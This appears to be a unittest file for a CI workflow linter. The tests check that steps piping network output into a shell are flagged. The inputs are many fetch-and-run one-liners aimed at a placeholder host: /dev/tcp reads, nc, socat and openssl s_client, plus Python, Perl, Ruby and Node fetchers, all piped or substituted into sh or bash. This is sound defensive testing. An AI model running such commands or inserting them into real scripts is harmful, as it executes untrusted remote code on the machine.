"""#2829: raw and otherwise unmodeled network output handed to a shell."""
import unittest

import workflow_guard as guard


HOST = "example.test"


class TestUnmodeledNetworkProducers(unittest.TestCase):
    def assert_loud(self, script):
        found = guard.job_defects([guard.Step("run", script)])
        self.assertEqual(1, len(found), (script, found))
        self.assertIn("unmodeled network", found[0][1])
        self.assertIn("straight to", found[0][1])

    def assert_clean(self, script):
        found = guard.job_defects([guard.Step("run", script)])
        self.assertEqual([], found, (script, found))

    def test_tcp_and_udp_pseudo_devices_are_network_inputs(self):
        for protocol in ("tcp", "udp"):
            path = "/dev/%s/%s/443" % (protocol, HOST)
            for script in ("cat <%s | sh" % path, "bash <%s" % path,
                           "cat 3<%s <&3 | dash" % path):
                with self.subTest(protocol=protocol, script=script):
                    self.assert_loud(script)

    def test_a_socket_descriptor_later_copied_to_a_shell_is_the_same_stream(self):
        self.assert_loud(
            "exec 3<>/dev/tcp/%s/443; "
            "printf 'GET /i.sh HTTP/1.0\\r\\n\\r\\n' >&3; "
            "cat <&3 | sh" % HOST,
        )

    def test_connecting_socket_clients_are_network_producers(self):
        cases = (
            "nc %s 443 | sh" % HOST,
            "ncat --ssl %s 443 | bash" % HOST,
            "netcat -v %s 443 | dash" % HOST,
            "socat - TCP:%s:443 | sh" % HOST,
            "socat OPENSSL:%s:443 STDOUT | bash" % HOST,
            "openssl s_client -quiet -connect %s:443 | sh" % HOST,
        )
        for script in cases:
            with self.subTest(script=script):
                self.assert_loud(script)

    def test_foreign_one_liners_name_the_network_api_they_read(self):
        cases = (
            "python3 -c 'import urllib.request as u; print(u.urlopen(\"https://%s/i.sh\").read().decode())' | sh" % HOST,
            "python -c 'import requests; print(requests.get(\"https://%s/i.sh\").text)' | bash" % HOST,
            "python3 -c 'import http.client as h; print(h.HTTPSConnection(\"%s\"))' | sh" % HOST,
            "perl -e 'use HTTP::Tiny; print HTTP::Tiny->new->get(\"https://%s/i.sh\")->{content}' | sh" % HOST,
            "ruby -e 'require \"net/http\"; puts Net::HTTP.get(URI(\"https://%s/i.sh\"))' | sh" % HOST,
            "node --eval 'fetch(\"https://%s/i.sh\").then(r => r.text()).then(console.log)' | sh" % HOST,
        )
        for script in cases:
            with self.subTest(script=script):
                self.assert_loud(script)

    def test_network_output_reaches_a_shell_through_passthrough_stages(self):
        for script in (
            "nc %s 443 | cat | sh" % HOST,
            "openssl s_client -connect %s:443 | tee copy | sed -n 1p | bash" % HOST,
            "{ nc %s 443; } | sh" % HOST,
        ):
            with self.subTest(script=script):
                self.assert_loud(script)

    def test_network_output_substituted_into_a_shell_is_reported_once(self):
        cases = (
            "eval \"$(nc %s 443)\"" % HOST,
            "bash -c \"$(openssl s_client -quiet -connect %s:443)\"" % HOST,
            "bash <(python3 -c 'import requests; print(requests.get(\"https://%s/i.sh\").text)')" % HOST,
        )
        for script in cases:
            with self.subTest(script=script):
                self.assert_loud(script)

    def test_literal_child_shell_bodies_keep_the_same_rule(self):
        for body in (
            "cat </dev/tcp/%s/443 | sh" % HOST,
            "ncat %s 443 | sh" % HOST,
            "openssl s_client -connect %s:443 | sh" % HOST,
            "python3 -c 'import urllib.request; print(urllib.request.urlopen(\"https://%s/i.sh\").read())' | sh" % HOST,
        ):
            with self.subTest(body=body):
                self.assert_loud("bash <<'EOF'\n%s\nEOF" % body)

    def test_listener_diagnostics_and_plain_programs_remain_clean(self):
        cases = (
            "nc -l 443 | sh",
            "nc -lv 443 | sh",
            "ncat --listen 443 | sh",
            "netcat -v -l 443 | sh",
            "nc --help | sh",
            "socat TCP-LISTEN:443 - | sh",
            "openssl dgst tool | sh",
            "openssl s_server -accept 443 | sh",
            "python3 -c 'print(1)' | sh",
            "python3 -c 'print(\"http\")' | sh",
            "python3 script-requests.py | sh",
        )
        for script in cases:
            with self.subTest(script=script):
                self.assert_clean(script)

    def test_a_network_command_not_feeding_a_shell_remains_clean(self):
        cases = (
            "nc %s 443" % HOST,
            "nc %s 443 | sha256sum" % HOST,
            "nc %s 443 > tool | sh" % HOST,
            "python3 -c 'import requests; print(requests.get(\"https://%s/i.sh\").text)' > tool" % HOST,
            "cat </dev/tcp/%s/443 > tool" % HOST,
        )
        for script in cases:
            with self.subTest(script=script):
                self.assert_clean(script)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
